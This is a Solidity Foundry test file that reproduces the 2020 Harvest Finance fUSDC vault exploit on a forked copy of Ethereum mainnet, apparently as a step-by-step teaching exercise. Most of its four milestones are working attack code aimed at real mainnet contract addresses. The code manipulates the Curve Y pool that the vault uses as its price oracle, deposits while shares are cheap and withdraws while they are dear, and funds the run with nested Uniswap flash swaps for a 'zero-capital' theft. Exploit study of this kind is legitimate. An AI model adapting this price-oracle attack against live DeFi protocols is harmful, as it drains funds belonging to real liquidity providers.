// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// Minimal interfaces — we only declare the functions we actually call. This is how
// you interact with contracts you don't have the source for: just the ABI you need.
interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
}

interface IHarvestVault {
    // Harvest V1 vaults expose the yEarn-style share price. THIS is the number the
    // exploit manipulates: deposit while it's artificially low, withdraw while high.
    function getPricePerFullShare() external view returns (uint256);
    function underlyingUnit() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function deposit(uint256 amount) external;
    function withdraw(uint256 numberOfShares) external;
}

interface ICurveY {
    // Curve Y pool "underlying" swap. Underlying indices: 0=DAI, 1=USDC, 2=USDT, 3=TUSD.
    // Dumping one stablecoin for another imbalances the pool — and Harvest read this pool
    // as its price oracle, so imbalancing it moves the vault's share price.
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

interface IUniPair {
    // Uniswap V2 flash swap: pass non-empty `data` and the pair sends you the tokens first,
    // then calls uniswapV2Call on you; you must repay borrowed + 0.3% before it returns.
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

/// MILESTONE 1: stand at the crime scene.
/// Fork mainnet at the block right before the Oct 26 2020 Harvest hack and read the
/// REAL vault's share price + supply. No mocks — this is actual mainnet state.
contract HarvestForkTest is Test {
    // Verified addresses (from the canonical DeFiHackLabs reproduction).
    address constant FUSDC = 0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE; // Harvest fUSDC vault
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant CURVE_Y = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51; // Curve Y swap (the oracle target)

    uint256 constant HACK_BLOCK = 11129473; // Oct 26 2020, the block the attack ran against

    function setUp() public {
        // This one line is the whole trick you were missing: pull REAL mainnet state
        // at a historical block into a local EVM you can run experiments against.
        vm.createSelectFork("mainnet", HACK_BLOCK);
    }

    function test_readCrimeScene() public {
        emit log_string("--- Real mainnet state at block 11,129,473 (pre-hack) ---");
        emit log_named_uint("USDC decimals", IERC20(USDC).decimals());
        emit log_named_uint("USDC totalSupply", IERC20(USDC).totalSupply());

        uint256 pps = IHarvestVault(FUSDC).getPricePerFullShare();
        emit log_named_uint("fUSDC pricePerFullShare (the exploit target)", pps);
        emit log_named_uint("fUSDC underlyingUnit", IHarvestVault(FUSDC).underlyingUnit());
        emit log_named_uint("fUSDC totalSupply", IHarvestVault(FUSDC).totalSupply());

        // Sanity: we are really talking to the real USDC contract.
        assertEq(IERC20(USDC).decimals(), 6, "not the real USDC?");
        assertGt(pps, 0, "vault share price should be readable");
    }

    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    /// MILESTONE 2: make the oracle bend.
    /// Grab a war chest (a flash loan gives you this for free — we simulate it with `deal`),
    /// dump it through the Curve pool to imbalance it, and watch the vault's share price move.
    function test_manipulatePrice() public {
        // A flash loan would hand us this; deal() writes the balance directly so we can focus
        // on the manipulation itself. ~17M USDT, echoing the size of the real attack leg.
        uint256 usdtAmount = 17_000_000 * 1e6;
        deal(USDT, address(this), usdtAmount);

        uint256 ppsBefore = IHarvestVault(FUSDC).getPricePerFullShare();
        emit log_named_uint("pricePerFullShare BEFORE", ppsBefore);

        // Approve via low-level call: USDT's approve() returns no bool, so a typed IERC20.approve
        // would revert on the decode. This is a real-world quirk you must handle.
        (bool ok,) = USDT.call(abi.encodeWithSignature("approve(address,uint256)", CURVE_Y, usdtAmount));
        require(ok, "USDT approve failed");

        // Dump USDT -> USDC in the Curve Y pool (indices 2 -> 1). This imbalances the pool the
        // vault prices itself against, pushing the share price DOWN — the "deposit cheap" setup.
        ICurveY(CURVE_Y).exchange_underlying(2, 1, usdtAmount, 0);

        uint256 ppsAfter = IHarvestVault(FUSDC).getPricePerFullShare();
        emit log_named_uint("pricePerFullShare AFTER ", ppsAfter);
        emit log_named_int("delta (AFTER - BEFORE)", int256(ppsAfter) - int256(ppsBefore));

        assertTrue(ppsAfter != ppsBefore, "manipulation had no effect - pool/oracle assumption wrong");
    }

    // approve() via low-level call so it works for BOTH USDC (returns bool) and USDT (returns nothing).
    function _approve(address token, address spender) internal {
        (bool ok,) = token.call(abi.encodeWithSignature("approve(address,uint256)", spender, type(uint256).max));
        require(ok, "approve failed");
    }

    /// MILESTONE 3: watch the theft happen.
    /// deposit while the oracle is cheap -> restore the pool -> withdraw while rich.
    /// End holding more stablecoins than we started with: the surplus is stolen from real LPs.
    function test_profitLoop() public {
        uint256 usdcWar = 50_000_000e6; // war chest a flash loan would provide (repaid in milestone 4)
        uint256 usdtWar = 17_000_000e6;
        deal(USDC, address(this), usdcWar);
        deal(USDT, address(this), usdtWar);

        _approve(USDC, CURVE_Y);
        _approve(USDT, CURVE_Y);
        _approve(USDC, FUSDC);

        uint256 start = IERC20(USDC).balanceOf(address(this)) + IERC20(USDT).balanceOf(address(this));
        emit log_named_uint("START stables (USDC+USDT)", start);

        // 1. Manipulate DOWN: dump USDT -> USDC, making the vault price cheap.
        ICurveY(CURVE_Y).exchange_underlying(2, 1, usdtWar, 0);
        emit log_named_uint("pps after DOWN", IHarvestVault(FUSDC).getPricePerFullShare());

        // 2. Deposit USDC into the cheap vault -> too many shares for the money.
        IHarvestVault(FUSDC).deposit(40_000_000e6);
        uint256 shares = IHarvestVault(FUSDC).balanceOf(address(this));
        emit log_named_uint("shares minted while cheap", shares);

        // 3. Manipulate UP: swap USDC -> USDT to restore the pool, lifting the price back.
        ICurveY(CURVE_Y).exchange_underlying(1, 2, 17_000_000e6, 0);
        emit log_named_uint("pps after UP", IHarvestVault(FUSDC).getPricePerFullShare());

        // 4. Withdraw the shares at the restored (higher) price -> more USDC back than we put in.
        IHarvestVault(FUSDC).withdraw(shares);

        uint256 end = IERC20(USDC).balanceOf(address(this)) + IERC20(USDT).balanceOf(address(this));
        emit log_named_uint("END stables (USDC+USDT)", end);
        if (end >= start) {
            emit log_named_uint(">>> PROFIT in one loop (USDC, 6 decimals)", end - start);
        } else {
            emit log_named_uint("<<< net LOSS this config (USDC)", start - end);
        }
    }

    // --- Milestone 4: the same attack, but funded entirely by flash loans (zero capital) ---
    address constant USDC_PAIR = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc; // UniV2 USDC/WETH (USDC=token0)
    address constant USDT_PAIR = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852; // UniV2 WETH/USDT (USDT=token1)
    uint256 constant USDC_LOAN = 50_000_000e6;
    uint256 constant USDT_LOAN = 17_000_000e6;

    function _safeTransfer(address token, address to, uint256 amt) internal {
        (bool ok,) = token.call(abi.encodeWithSignature("transfer(address,uint256)", to, amt));
        require(ok, "transfer failed");
    }

    // Make sure we hold at least `needed` of `token`, topping up via a small Curve swap if short.
    function _ensureBalance(address token, uint256 needed) internal {
        uint256 bal = IERC20(token).balanceOf(address(this));
        if (bal >= needed) return;
        uint256 short = needed - bal + 1000e6; // small buffer for swap fee
        if (token == USDT) ICurveY(CURVE_Y).exchange_underlying(1, 2, short, 0); // USDC->USDT
        else ICurveY(CURVE_Y).exchange_underlying(2, 1, short, 0); // USDT->USDC
    }

    /// MILESTONE 4: zero-capital attack. We hold nothing; flash loans provide the $67M.
    function test_flashLoanAttack() public {
        _approve(USDC, CURVE_Y);
        _approve(USDT, CURVE_Y);
        _approve(USDC, FUSDC);

        emit log_named_uint("USDC we own at start (should be ~0)", IERC20(USDC).balanceOf(address(this)));

        // Kick it off: borrow USDC (token0) from the USDC/WETH pair. Non-empty data => flash swap.
        IUniPair(USDC_PAIR).swap(USDC_LOAN, 0, address(this), abi.encode("go"));

        // Everything unwound and both loans repaid; whatever's left is pure profit.
        uint256 profit = IERC20(USDC).balanceOf(address(this)) + IERC20(USDT).balanceOf(address(this));
        emit log_named_uint(">>> ZERO-CAPITAL PROFIT (USDC+USDT, 6 dp)", profit);
        assertGt(profit, 0, "attack did not net a profit after repaying flash loans");
    }

    // Uniswap V2 flash-swap callback. Called twice (once per pair); we branch on msg.sender.
    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        if (msg.sender == USDC_PAIR) {
            // We now hold 50M USDC. Nest a USDT flash loan (USDT = token1 on this pair).
            IUniPair(USDT_PAIR).swap(0, USDT_LOAN, address(this), abi.encode("inner"));
            // Inner returned with the heist done + USDT loan repaid. Repay the USDC loan + 0.3%.
            uint256 repay = USDC_LOAN * 1000 / 997 + 1;
            _ensureBalance(USDC, repay);
            _safeTransfer(USDC, USDC_PAIR, repay);
        } else if (msg.sender == USDT_PAIR) {
            // We now hold 50M USDC + 17M USDT. Run the manipulation loop (same as milestone 3).
            ICurveY(CURVE_Y).exchange_underlying(2, 1, USDT_LOAN, 0); // manipulate DOWN
            IHarvestVault(FUSDC).deposit(40_000_000e6); // deposit cheap
            ICurveY(CURVE_Y).exchange_underlying(1, 2, 17_000_000e6, 0); // manipulate UP
            IHarvestVault(FUSDC).withdraw(IHarvestVault(FUSDC).balanceOf(address(this))); // withdraw rich
            // Repay the USDT loan + 0.3%.
            uint256 repay = USDT_LOAN * 1000 / 997 + 1;
            _ensureBalance(USDT, repay);
            _safeTransfer(USDT, USDT_PAIR, repay);
        }
    }
}
